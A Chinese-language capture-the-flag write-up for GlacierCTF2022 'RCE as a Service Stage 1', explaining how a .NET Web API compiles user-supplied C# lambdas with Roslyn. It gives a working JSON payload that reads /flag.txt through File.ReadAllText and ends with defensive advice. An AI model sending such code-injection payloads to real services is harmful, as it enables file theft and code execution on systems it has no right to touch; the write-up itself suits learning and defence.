# GlacierCTF2022 - RCE as a Service Stage 1

## 题目简述

.NET 6 Web API 接收字符串数组 `Data` 和一段 C# lambda `Query`。后端把 lambda 原样插入源码，用 Roslyn 编译成 DLL、加载后通过反射执行。目标是利用这一本来就等价于代码执行的接口读取根目录 `/flag.txt`。

## 解题过程

用户输入被放进静态字段初始化式：

```csharp
public static Func<IEnumerable<string>, IEnumerable<object>> CreateQuery
    = USER_QUERY;
```

编译器引用了入口程序集使用的全部依赖，并默认导入 `System`、`System.Collections.Generic` 与 `System.Linq`。因此 lambda 不必逃出字符串或破坏模板，直接在 `Select` 中调用文件 API：

```json
{
  "Data": ["placeholder"],
  "Query": "(data) => data.Select(d => System.IO.File.ReadAllText(\"/flag.txt\"))"
}
```

将 JSON POST 到 `/rce`。服务编译并加载新程序集，枚举 `Data` 时执行一次 `ReadAllText`，返回的 JSON 数组包含：

```text
glacierctf{ARE_YOU_AN_3DG3L9RD?}
```

异常处理器还会把完整编译错误返回给客户端，可用于迭代 payload，但这条直接表达式不需要额外探测。

## 方法总结

把用户 lambda 拼入 Roslyn 源码并加载执行，本质上就是远程代码执行接口，反射调用并不会形成安全边界。若只需要数组筛选或映射，应定义有限操作集合或解析受控表达式树，并在隔离进程中执行；不能让请求内容进入通用 C# 编译器。
